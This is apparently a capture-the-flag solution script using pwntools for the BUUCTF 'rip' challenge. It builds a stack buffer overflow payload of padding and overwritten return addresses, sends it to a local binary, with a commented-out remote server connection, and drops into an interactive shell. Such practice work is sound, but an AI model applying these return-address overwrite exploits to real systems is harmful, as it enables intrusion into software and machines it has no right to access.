from pwn import *

path="/mnt/e/S/CTF/BUUCTF/PWN/rip"

#payload=b'a'*(128+8)+p64(0x00400596)
#payload = b'a'*(0xf+8)+ p64(0x401185) + p64(0x401187)
payload = 'a' * 23 + p64(0x401185).decode("iso-8859-1") +  p64(0x401186).decode("iso-8859-1");
sh=process(path)
#sh=remote('node4.buuoj.cn',28414)

#sh.recvuntil("please input")

sh.sendline(payload)

sh.interactive()